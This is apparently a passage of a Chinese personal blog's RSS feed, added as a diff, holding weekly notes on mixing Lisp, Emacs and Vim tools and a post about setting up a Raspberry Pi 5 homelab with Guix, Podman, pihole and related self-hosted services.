+觉得这个问题还没有解决。也许你，可以考虑一下。🙂&lt;/p&gt;&lt;h2 id=&quot;结尾&quot;&gt;结尾&lt;/h2&gt;&lt;p&gt;想象一下如果你能重写所用语言的代码，你的表现力会有多大。
+你将和语言设计师站在同一水平，而你在这一层级编写的抽象，累积起来能让你少走数年的弯路。&lt;/p&gt;&lt;p&gt;突然间，那些括号看起来挺酷的！&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;感谢 Daniel Woelfel, Alex Kotliarskyi, Sean Grove, Joe Averbuk, Irakli Safareli 对本文草稿的审阅&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 当然，我们也可以用它写 &lt;a href=&quot;https://stopa.io/post/263&quot; class=&quot;external_link&quot;&gt;Y 组合子&lt;/a&gt; !&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; Cursive 的文档里有一个&lt;a href=&quot;https://cursive-ide.com/userguide/paredit.html&quot; class=&quot;external_link&quot;&gt;很棒的演示&lt;/a&gt; 。&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 例如 JavaScript 里 &lt;a href=&quot;https://www.sweetjs.org/doc/tutorial.html#sweet-let&quot; class=&quot;external_link&quot;&gt;sweet.js&lt;/a&gt; 有在尝试支持宏。不过你可以看到在那里操作源代码仍然不如用代码当成数据来得直观。&lt;/p&gt;&lt;p&gt;译按：另一篇对此文章的翻译： &lt;a href=&quot;https://southerncross.github.io/blog/2020/11/an-intuition-for-list-syntax.html&quot; class=&quot;external_link&quot;&gt;【译】Lisp语法的直观解释 | Lishunyang's Blog&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #9: 边缘行者</title><guid>https://blog.southfox.me/2025/12/fox-thinking-9/index.html</guid><pubDate>Sun, 14 Dec 2025 21:33:00 Z</pubDate><link>https://blog.southfox.me/2025/12/fox-thinking-9/index.html</link><description>&lt;p&gt;周刊第十期！没想到就已经第十期了，感觉写下第一期的场景已经迷迷糊糊了，但至少留下了一点文字，也算是这
+个周刊的意义。我有点想对一段的时间内周刊做个总结，看看哪些事物发生了变化，但是创刊时定的试运行
+为期三个月，那我就以一个季度来做为总结吧，刚好也能「顺带」把今年的年终总结写了。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;周刊第十期！没想到就已经第十期了，感觉写下第一期的场景已经迷迷糊糊了，但至少留下了一点文字，也算是这
+个周刊的意义。我有点想对一段的时间内周刊做个总结，看看哪些事物发生了变化，但是创刊时定的试运行
+为期三个月，那我就以一个季度来做为总结吧，刚好也能「顺带」把今年的年终总结写了。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;边缘行者的诞生&quot;&gt;边缘行者的诞生&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;社会边缘人是社会学家罗伯特·E·帕克和埃弗里特·斯托内奎斯特首先提出的一个社会学概念，&lt;/p&gt;&lt;p&gt;以用来解释一个受两种文化影响的个体如何构建自己的身份认同。 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;「边缘人」很适合当社会学家，因为站在不同系统遍能更好地洞察各个系统 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。在这周再一次努力试图将两个系统「黏」合在一
+起时惊讶发现在计算机领域我已经算是一个边缘行者了，看看我现在的所用的应用、环境、配置都不是单一的，都由不同的部分组成。例如
+写这篇文章的编辑器是 Emacs 但实际用的是 Vim 的按键模式。原因单纯是当时对比了一下 Vim 和 Emacs 的相关资料数量，发现
+Vim 的资料比较多而 Emacs 也支持配置成 Vim 的模式就这么用下去了，没想到当时的选择竟深深影响到了现在。连日常用编辑器
+都如此其它的就更是如此了，例如平常写点脚本我也更倾向于用 &lt;a href=&quot;https://hylang.org/&quot; class=&quot;external_link&quot;&gt;Hy&lt;/a&gt; （在 Python 上的
+一个 lisp 方言）或 Clojure （一个在 jvm 上的 lisp 方言）写；平常的系统用着 Arch Linux 但
+实际今年开始就更多在和 Guix 打交道了；终端里用的多路复用工具是 Zellij 但平常用得最多的依然是 Tmux 的按键操作。&lt;/p&gt;&lt;p&gt;这种混用的方式给我带来了一种舒适，我可以保持一种开放的方式去调整和创造什么，但是困苦的也在于此，这种混杂非常
+特化，我现在就算是用着 Vim 的按键操作但也会时不时的用着 M-x 然后调用几个 Emacs 上的命令；Zellij 按着 C-b 的 Tmux 操作
+前缀也时不时按一些 Zellij 才有的快捷键。抵达这种状态所付出的努力也有点像是两头堵，想法很美好就是可以取个并集来集多家
+之长但是在找资料学习的时候只会取到差集——很多时候还是空集，难以单纯套用一边的经验只好自己去慢慢摸索。而且说是取得了多家之长但我
+很明显也是有侧重的，很容易在某个领域成为半吊子。我现在虽然知道如何 Vim 取括号里面的字符快速替换快速查找文本，但是连怎么
+开启 Vim 行号显示都不知道…… &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;h3 id=&quot;蛋糕坯还是糖霜？&quot;&gt;蛋糕坯还是糖霜？&lt;/h3&gt;&lt;p&gt;不过上面说得都的是一种类似杠杠想法，试图用一种小众领域去博取更大众领域优势的想法，这种论述之前就有人写
+过详细的了（ &lt;a href=&quot;https://dthompson.us/posts/lisp-icing-or-cake.html&quot; class=&quot;external_link&quot;&gt;Lisp: Icing or Cake? — dthompson&lt;/a&gt; ），选择做蛋糕坯还是做糖霜：做蛋糕坯更艰难但是最后会带来更大
+的好处；做点糖霜能够直接带来回报但是会受限于底下的坯体。很明显，我这种实用主义拿来就用的懒狐最后还是选择做糖霜了。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;《回到种子里去》：马尔克斯的杂文集，我还挺喜欢这种小杂文的，带上这本书在通勤之类的零碎时间随手一翻就能看，而且还不用强求
+一定是线性阅读翻到哪读那，这么说有点像是短视频。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://twobithistory.org/2018/12/18/rss.html&quot; class=&quot;external_link&quot;&gt;The Rise and Demise of RSS&lt;/a&gt;: 一个讲述 RSS 起源的文章。这周为博客加上了之前一直雪藏着的 Atom 格式的订阅源链接放在了侧边栏，
+还拿 &lt;a href=&quot;https://www.rssboard.org/rss-validator/&quot; class=&quot;external_link&quot;&gt;校验器&lt;/a&gt; 检查了下我输出的 RSS 文件，发现存在的一些问题，包括时间格式和其中的一些 URL 带着没转义的空格
+和中文字符。时间的格式修改到了符合规范的格式，不过 URL 编码这个看了看有点难整所以先暂时推到未来再说了。好像从九月份转换博客框架
+以来输出的 RSS 文件就有点问题，现在纯靠各家订阅应用的解析器兜底，感觉有点尴尬……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://pagedout.institute/&quot; class=&quot;external_link&quot;&gt;Paged Out!&lt;/a&gt;: 一个由社区供稿的免费实验刊物，这种刊物的感觉让我回想起了关于报刊亭的时光，现在我还能想起买纸质刊物的时候就是在机场
+的书店里逛到然后买下的《博物》和《中国国家地理》，但是一年可能就那么一两次。还是挺怀念这种刊物感的，这也是我现在写周刊的原因吧……不
+过用心程度和 Paged Out 这种就没法比了，我想之后可以向这种刊物能多学习。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;这周终于也是把树莓派的博文给写出来了（ &lt;a href=&quot;/2025/12/does-the-fox-eat-raspberry-pi/&quot;&gt;狐狸会喜欢树莓做的派吗？树莓派鼓捣记&lt;/a&gt; ），可喜可贺可喜可贺。&lt;/p&gt;&lt;p&gt;这周同时还在搞的项目是一个针对
+&lt;a href=&quot;https://curiositystream.com&quot; class=&quot;external_link&quot;&gt;curiosity stream&lt;/a&gt; 的代替前端，因为这周查阅邮件的时候发现已经快要到续费的时候了。今年这个流媒体平台看的不多，主要原因是在 PC 端
+上观影体验不佳看的影片清晰度一直很低，但安卓 APP 是正常的。排查了一下发现是网页端的播放器用的 dash 播放器一直锁不住清晰度
+,原因是 dash 协议会自动推测网络速度而自动选择清晰度而我的网络测速不佳（但实际还是有速度的）然后导致 curiosity stream
+的播放器一直在锁定在低清晰度。然后我就一时兴起了抓取了一下 api 解析出视频地址然后丢到 &lt;a href=&quot;https://dashjs.org/&quot; class=&quot;external_link&quot;&gt;dashjs&lt;/a&gt; 这个播放器里发现
+直接能跑 2K 清晰度的，于是就更加兴起了想把整个的逻辑理顺，也是因为选择的 &lt;a href=&quot;https://lips.js.org/&quot; class=&quot;external_link&quot;&gt;lips&lt;/a&gt; 这个在 javascript 上构
+建 scheme lisp 的库（啊，又是糖霜，这就是在主题部分说的将两个系统「黏」合在一起的项目）比较「好玩」所以现在正在努力把玩中。
+也是实在体验到了前端开发的乐趣，一种这里鼓捣那里鼓捣微调然后马上去刷新页面检查效果的投入感……希望能在下周鼓捣
+到基本能用吧。当然，curiosity stream 的费用还是续了，毕竟能够方便找到纪录片的平台不多，一边看纪录片
+一边学外语，两件快乐事情重合在一起。而这两份快乐，又给我带来更多的快乐……&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E7%A4%BE%E6%9C%83%E9%82%8A%E7%B7%A3%E4%BA%BA&quot; class=&quot;external_link&quot;&gt;社会边缘人 - 维基百科，自由的百科全书&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 上野千鹤子. 从提问到输出. 文汇出版社, 2024, 第 9 页.&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 搜了下是 &lt;code&gt;:set nu&lt;/code&gt;&lt;/p&gt;</content:encoded></item><item><title>狐狸会喜欢树莓做的派吗？树莓派鼓捣记</title><guid>https://blog.southfox.me/2025/12/does-the-fox-eat-raspberry-pi/index.html</guid><pubDate>Fri, 12 Dec 2025 14:18:00 Z</pubDate><link>https://blog.southfox.me/2025/12/does-the-fox-eat-raspberry-pi/index.html</link><description>&lt;p&gt;今年双十一的时候出于好像得买点什么非常「消费主义」念头购入了一块 8G 版的树莓派 5 和一块 2T 的七彩虹 ME700 固态硬盘。
+现在一个月过去了，在不断折腾下也算是有点能写的东西了，所以在这里写成一篇文章。&lt;/p&gt;&lt;p&gt;在硬件上折腾并不多，除了开头买的固态硬盘转接板小了点一开始很灵车的拿了板子暂时压住（见 &lt;a href=&quot;/2025/11/fox-thinking-5/&quot;&gt;FoxThinking #5&lt;/a&gt; ），之后再加购了个合适
+长度的转接板接上最后没什么问题了。用 fio 测速了一下，读写标称 7000MB/s 和 5500MB/s 的硬盘通过转接板后只能跑出读写均只有
+420MB/s 的「好成绩」，真算得上是吕布骑狗了。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;今年双十一的时候出于好像得买点什么非常「消费主义」念头购入了一块 8G 版的树莓派 5 和一块 2T 的七彩虹 ME700 固态硬盘。
+现在一个月过去了，在不断折腾下也算是有点能写的东西了，所以在这里写成一篇文章。&lt;/p&gt;&lt;p&gt;在硬件上折腾并不多，除了开头买的固态硬盘转接板小了点一开始很灵车的拿了板子暂时压住（见 &lt;a href=&quot;/2025/11/fox-thinking-5/&quot;&gt;FoxThinking #5&lt;/a&gt; ），之后再加购了个合适
+长度的转接板接上最后没什么问题了。用 fio 测速了一下，读写标称 7000MB/s 和 5500MB/s 的硬盘通过转接板后只能跑出读写均只有
+420MB/s 的「好成绩」，真算得上是吕布骑狗了。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;不过想开点上固态硬盘不用听「炒豆声」也是件好事，而且找补一下在双十一购入的时机也正是时候，在现在 DRAM 芯片价格飙升的时候买也是赶
+上末班车了 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。在考虑买树莓派之前我也考虑过其它的「国产派」，纸面参数更好而且更便宜，似乎是更好的选择？但我在实际逛
+了相关的店铺后发现有点不对劲，可选的东西很少而且并没有参与什么活动。网上搜了下发现一些吐槽，包括找不到什么工程师啦、快速发板的策略
+导致旧产品很快就没维护啦等等。为了减少折腾我还是直接买树莓派吧，而且也有一些店铺参与了双十一活动，最后就购入了最基本入门套餐（那些
+嵌入式的传感器马达之类的我不怎么感兴趣就觉得没必要买了）。&lt;/p&gt;&lt;p&gt;然后来说说在系统上面的折腾吧，首先就是刷入系统，查找了下相关资料发现 Arch linux 对于 ARM 的支持比较堪忧，社区似乎没什么活跃度，看起来没多少
+人用 Arch 系统来折腾树莓派这种边缘设备啊。之后不折腾选择官方系统，这方面我直接用官方的镜像刷入应用将桌面版系统刷入到店铺附赠的 SD 卡然后通过 VNC
+打开远程桌面里面打开镜像刷入应用然后往固态硬盘刷入无桌面的 lite 版。这个看起来很古怪的流程是因为我没有其它能够刷入固态硬盘的手段，然后试了下
+将 lite 系统刷入到 SD 然后在系统中将数据拷贝到固态硬盘的方式失败了，索性就直接通过官方的镜像刷入应用操作不操其它心了。刚好将这个 SD 卡内的系统
+作为一个救援系统。刷好系统后通过官方 raspi-config 将从固态硬盘调整到第一启动项就可以了，用官方系统的这些设置上就不用怎么操心也是挺好的。&lt;/p&gt;&lt;h1 id=&quot;想当然的鼓捣&quot;&gt;想当然的鼓捣&lt;/h1&gt;&lt;p&gt;软件上的折腾倒是没有什么稀奇的，跟其它在 VPS 等 linux 机器上折腾的差不多，不过就是因为太差不多了所以有点倦了：弄点 docker-compose.yml 或者
+在包管理器装点应用；编辑配置文件；调一下 nginx 文件……这些事因为做过太多次了所以就没有热情了。欸，如果有一个方式只需要填点参数就能配好服务就好了
+啊，最好不要是什么类似 ansible 的基于 yaml 的方式而是更直接的方式，用「正常」的编程语言例如 python 写点配置：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;setup_service(application=&amp;quot;tailscale&amp;quot;, systemd_enable=&amp;quot;tailscaled&amp;quot;)
+setup_nginx_service(host=&amp;quot;blog.example.com&amp;quot;, nginx_root=&amp;quot;/var/host/blog&amp;quot;)
+setup_nginx_service(host=&amp;quot;pihole.internal&amp;quot;, application=&amp;quot;pihole&amp;quot;, config_path=&amp;quot;...&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后通过一些「神奇」的一通操作就能配好所有相关服务和配置文件了，
+这好像有点想当然了（wishful thinking），在顶层这么只是想想那底层该怎么考虑呢？可以考虑到将服务使用一个
+规范来规定 &lt;strong&gt;如何解释自己服务&lt;/strong&gt; 和 &lt;strong&gt;如何影响其它服务&lt;/strong&gt;  。一个生活化比方就是做菜：&lt;/p&gt;&lt;p&gt;做菜需要准备很多东西并执行很多步骤，如何尽可能地管控复杂度呢？例如我想要做一碗「黯然销魂饭」，可
+以先声明一个「做菜声明」服务：里面「如何解释自己」为具体做菜的步骤，例如将什么食材放入什么厨具做什么
+操作（将米饭进行淘米后放入煤气炉灶蒸煮……）；而「如何影响其它服务」是向「食材准备服务」声明想要
+什么材料（米饭、肉、盐、油……）和「厨具准备材料」声明想要什么厨具（煤气炉灶、锅铲、勺子……）。然
+后「下面」的服务可以继续执行这套流程，「食材准备服务」和「厨具准备服务」的「如何解释自己」是将自己收到
+的需求列成一份清单；而「如何影响其它服务」是向「购物服务」提交清单。最后的「购物服务」的「如何解释自己」
+就是将收到的清单汇总并到商场里头购买，至于「如何影响其它服务」？这是个底下实际办事的服务，做好
+自己的事就好了，谈不上影响（好吧其实就是不需要）。&lt;/p&gt;&lt;p&gt;这种方式就类似软件设计，将一个模糊宽泛的需求拆成一个个具体的「函数」，这里带来的好处就是如果是以
+一个「正经」编程语言实现（不要用 yaml 实现了，求求了）的话，可以很轻松复用流程控制语法和已有的函数。例如通过主机名
+进行判断达成在不同机器上部署不同服务的效果：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;if hostname == &amp;quot;homelab&amp;quot;:
+    setup_service(application=&amp;quot;zerotier&amp;quot;, systemd_enable=&amp;quot;zerotier-one&amp;quot;)
+    setup_nginx_service(host=&amp;quot;blog.example.com&amp;quot;, nginx_root=&amp;quot;/var/host/blog&amp;quot;)
+    setup_nginx_service(host=&amp;quot;pihole.internal&amp;quot;, application=&amp;quot;pihole&amp;quot;, config_path=&amp;quot;...&amp;quot;)
+    ...
+if hostname == &amp;quot;vps1&amp;quot;:
+    setup_service(application=&amp;quot;tailscale&amp;quot;, systemd_enable=&amp;quot;tailscaled&amp;quot;)
+    setup_nginx_service(host=&amp;quot;git.example.com&amp;quot;, application=&amp;quot;forgejo&amp;quot;, port=&amp;quot;8081&amp;quot;)
+    ...
+
+
+calculate_services()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在上面这个例子中，一个可能的实现是假设一层层传递到底下会有
+类似「包管理服务」收集了 nginx, docker, tailscale 这种软件，那么里面「如何解释自己」是将自己收集到的包转成一行命
+令，例如： &lt;code&gt;apt install -y nginx docker tailscale&lt;/code&gt;  ，而最后的「如何影响其它服务」就是向「代码执行服务」添加
+命令。而「代码执行服务」就是将所有声明服务传递进来的命令收集到一个类似 &lt;code&gt;final_script.sh&lt;/code&gt; 这样的脚
+本中。这样等「计算」完整体的服务后，执行这个脚本就相当于完成了部署操作了。&lt;/p&gt;&lt;h1 id=&quot;凑合就好&quot;&gt;凑合就好&lt;/h1&gt;&lt;p&gt;虽然上面的方案好像挺简单并且可能鼓捣一下也确实能用，不过我这种懒狐还是很「拿来主义」的，上面所说的基本就是
+Guix &lt;a href=&quot;https://guix.gnu.org/manual/en/html_node/Service-Types-and-Services.html&quot; class=&quot;external_link&quot;&gt;Service Types and Services&lt;/a&gt; 的解释。这种方式在理解后确实还是很直接的，只用记住如
+何 &lt;strong&gt;如何解释自己服务&lt;/strong&gt; 和 &lt;strong&gt;如何影响其它服务&lt;/strong&gt; 就能掌握个大概。用这种方式我也是成功的把相关的配置塞进了少数
+几个文件里，虽然离完全抽象顶层的简单定义还有段距离，不过还是，也不是不能用吧。&lt;/p&gt;&lt;h1 id=&quot;鼓捣的服务&quot;&gt;鼓捣的服务&lt;/h1&gt;&lt;h2 id=&quot;podman&quot;&gt;podman&lt;/h2&gt;&lt;p&gt;首先在树莓派上我是用了 Podman 作为容器的方案，不选 docker 是因为看重了 podman 注重 rootless 还不需要一个在后台常驻的守护进程。
+Podman 在 Guix 里就可以直接安装，不过好像基本都要自己源码编译安装，官方的缓存服务器经常命中不了二进制产物，看来不管是 Arch ，在 Guix 里
+也很少用 ARM 平台的啊。&lt;/p&gt;&lt;p&gt;因为 podman 不是 docker ，所以默认并不会觉得镜像是在 &lt;code&gt;docker.io&lt;/code&gt; 上，所以相关的镜像名称要写全，例如 nginx 在 docker 里
+只用写 &lt;code&gt;nginx:latest&lt;/code&gt; 但在 podman 里要写成 &lt;code&gt;docker.io/library/nginx:latest&lt;/code&gt; 。同时还需要往 &lt;code&gt;~/.config/containers/policy.json&lt;/code&gt; 声明
+能向什么服务商拉取镜像，不安全的写法可以写接受全部：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot;&gt;{ &amp;quot;default&amp;quot;: [ { &amp;quot;type&amp;quot;: &amp;quot;insecureAcceptAnything&amp;quot; } ]&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;calibre-web&quot;&gt;calibre-web&lt;/h2&gt;&lt;p&gt;通过 podman-compose 拉起的程序，因为在 &lt;a href=&quot;https://www.humblebundle.com/&quot; class=&quot;external_link&quot;&gt;Humble Bundle&lt;/a&gt; 买了几个书籍捆绑包也是堆了百来个电子书了（详情见 &lt;a href=&quot;/2025/11/fox-thinking-6/&quot;&gt;FoxThinking #6&lt;/a&gt; ），
+所以需要一个管理的程序，最后也是选择了 &lt;a href=&quot;https://github.com/janeczku/calibre-web&quot; class=&quot;external_link&quot;&gt;calibre-web&lt;/a&gt; 。官方不推荐将数据库文件放到网络存储上所以我现在就简单通过 rsync 来同步状态，
+不过这需要我自己维护状态手动选择哪边的状态进行同步，可能之后可以写点脚本自动比对树莓派上和本地的状态哪边新就更新到哪边吧，感觉
+有点类似 git 了……&lt;/p&gt;&lt;h2 id=&quot;aria2&quot;&gt;aria2&lt;/h2&gt;&lt;p&gt;通过 guix 安装，是一个简单的下载程序，从网上拷贝了一份配置文件就这么直接用了，虽然用的不多但是胜在多线程和 bt 下载的能用上。&lt;/p&gt;&lt;h3 id=&quot;ariang&quot;&gt;ariang&lt;/h3&gt;&lt;p&gt;一个静态的前端，通过 json-rpc 和后面的 aria2 交互，在网页上展示点下载速度曲线和新增下载任务，比敲命令行好点（主要不会将又长又杂的下载地址放到
+历史记录干扰到 fzf )。&lt;/p&gt;&lt;h2 id=&quot;webhook&quot;&gt;webhook&lt;/h2&gt;&lt;p&gt;通过 guix 安装，是一个用 go 写的程序 &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 提供 webhook 服务，webhook 简单说就是提供一个 uri 当有 GET 或者 POST 的 HTTP 请求时执行一些动作
+(例如执行脚本)，
+我现在用来触发下我的博客构建流程。&lt;/p&gt;&lt;h2 id=&quot;syncthing&quot;&gt;syncthing&lt;/h2&gt;&lt;p&gt;通过 guix 安装，一个 P2P 式的文件同步软件，我通过它来同步我的笔记。因为我的树莓派现在没有作任何的备份措施所以我就在我的设备
+上（包括手机）用 syncthing 来进行备份（感觉……有点类似 git 了）。&lt;/p&gt;&lt;h2 id=&quot;rslsync&quot;&gt;rslsync&lt;/h2&gt;&lt;p&gt;虽然是直接从官网下载的二进制文件但通过 guix 定义的安装过程也算是通过 guix 安装，我用来同步&lt;a href=&quot;https://www.shuge.org/foryou/resilio_sync/&quot; class=&quot;external_link&quot;&gt;书格&lt;/a&gt;的一些古籍资料，对比起
+syncthing ，rslsync 是面向公网有点类似种子下载而 syncthing 是面向个人的比较私域（类似 git )。&lt;/p&gt;&lt;h2 id=&quot;cloudflared&quot;&gt;cloudflared&lt;/h2&gt;&lt;p&gt;通过 guix 定义的编译流程所以也能算是通过 guix 安装。用 cloudflare 的网络进行内网穿透，我现在用来提供博客（树莓派不得不尝的用途）
+和 webhook 服务的访问。
+虽然 cloudflare 免费且功能丰富，不过为了更有独立性我看看之后能不能找到一个可自托管选项，简单点 frp 也可以不过感觉面对大墙可能
+会有点不稳定。&lt;/p&gt;&lt;h2 id=&quot;anki&quot;&gt;anki&lt;/h2&gt;&lt;p&gt;通过 podman 安装 &lt;sup&gt;&lt;a href=&quot;#4&quot; id=&quot;4r&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 然后开启的代替 anki-web 的 sync 服务，用来在各种设备之间的同步统计资料和牌组文件，通过 cloudflared 提供公
+网访问，资料在所有设备上都会存一份只不过用树莓派提供一个同步渠道（感觉……还是有点类似 git ）。&lt;/p&gt;&lt;h2 id=&quot;nginx&quot;&gt;nginx&lt;/h2&gt;&lt;p&gt;通过 guix 安装，不过因为上游的定义里没有带上 &lt;code&gt;realip module&lt;/code&gt; 所以我简单继承了上游的定义加上了 &lt;code&gt;--with-http_realip_module&lt;/code&gt; 的参数。
+对这个程序再无话说，只是速速用起来。&lt;/p&gt;&lt;h2 id=&quot;pihole&quot;&gt;pihole&lt;/h2&gt;&lt;p&gt;使用 podman-compose 安装，一个自建的 dns 服务，对比起四年前的博文 &lt;a href=&quot;/2021/07/搭建无污染的DNS服务/&quot;&gt;搭建无污染的DNS服务&lt;/a&gt; 不同是 pihole 里终于在 pi 上运行了，而且在可触及范围内搭建
+比较方便该路由器设置 DNS 让局域网内的设备网络请求都经过 pihole 。&lt;/p&gt;&lt;p&gt;另外就是 podman 里的服务似乎会占用 53 端口和 pihole 冲突，得需要在 &lt;code&gt;~/.config/containers/containers.conf&lt;/code&gt; 里配置成另外的端口规避：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot;&gt;[network]
+dns_bind_port=5000&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;smartdns&quot;&gt;smartdns&lt;/h3&gt;&lt;p&gt;一个功能丰富的 dns 应用，在最近支持网页控制台后其实完全就可以替换 pihole 了，不过既然都用树莓派了我还是
+继续用着 pihole 吧，现在用着 smartdns 主要是作为 pihole 的上游然后搭配 &lt;a href=&quot;https://github.com/felixonmars/dnsmasq-china-list&quot; class=&quot;external_link&quot;&gt;dnsmasq-china-list&lt;/a&gt; 项目作为国内服务
+的加速和国外的 DOH 分流。&lt;/p&gt;&lt;h2 id=&quot;zerotier&quot;&gt;zerotier&lt;/h2&gt;&lt;p&gt;通过 guix 定义的编译流程所以也能算是通过 guix 安装，用来组建方便在公网环境的访问的虚拟局域网。不得不说在 guix 上的投入还是值得
+的，之前为 steam deck 写的 &lt;sup&gt;&lt;a href=&quot;#5&quot; id=&quot;5r&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; zerotier 定义在 debian 系统也能轻松跑起来，这种编写一次到处运行的滋味还是挺美妙的。&lt;/p&gt;&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;&lt;p&gt;这篇博文到最后快要变成 guix 的安利文了？&lt;/p&gt;&lt;p&gt;不过我现在用着 GNU/Linux 然后用着 Emacs 写着东西然后用点 Lisp 折腾树莓派，感觉快要成为那种典型的自由极客了。一路过来感想是
+虽然有点痛苦但好像也没那么痛苦，在现在互联网发展快三十年的时代哪怕不融入社区不和人交流只凭一些网上「捕风捉影」的消息也能在小众领域行走。
+说到这发现我确实不怎么依赖社区和求助于他人，遇到难题只会死磕实在磕不过就会放弃睡大觉，虽然这也没什么 &lt;sup&gt;&lt;a href=&quot;#6&quot; id=&quot;6r&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; ，不过想想有时候求助他人
+可能是一个「省力」的选择呢？或许这点可以作为下一年的课题……&lt;/p&gt;&lt;h1 id=&quot;脚注&quot;&gt;脚注&lt;/h1&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.solidot.org/story?sid=82733&quot; class=&quot;external_link&quot;&gt;奇客Solidot | DRAM 芯片价格涨幅超过黄金&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.solidot.org/story?sid=82935&quot; class=&quot;external_link&quot;&gt;奇客Solidot | 树莓派因为内存价格飙升而涨价&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://github.com/adnanh/webhook&quot; class=&quot;external_link&quot;&gt;Webhook GitHub 地址&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#4r&quot; id=&quot;4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://github.com/LuckyTurtleDev/docker-images&quot; class=&quot;external_link&quot;&gt;GitHub - LuckyTurtleDev/docker-images&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#5r&quot; id=&quot;5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;/2025/05/configure-steam-deck/&quot;&gt;Steam Deck 可劲折腾&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#6r&quot; id=&quot;6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.solidot.org/story?sid=82831&quot; class=&quot;external_link&quot;&gt;奇客Solidot | 很多时候放弃是最明智的选择&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;修改历史&quot;&gt;修改历史&lt;/h1&gt;&lt;p&gt;&amp;lt;2026-02-06 Fri 00:22&amp;gt; 将用 python 伪代码的例子更改为用做菜煮饭的例子。&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #8: 守住八分地</title><guid>https://blog.southfox.me/2025/12/fox-thinking-8/index.html</guid><pubDate>Sun, 07 Dec 2025 20:04:00 Z</pubDate><link>https://blog.southfox.me/2025/12/fox-thinking-8/index.html</link><description>&lt;p&gt;百分之八十的资源只会在百分之二十手上：论文引用数量、代码中的错误数量、地震的震级情况、人们的财富分布，这没有什么稀奇的，这
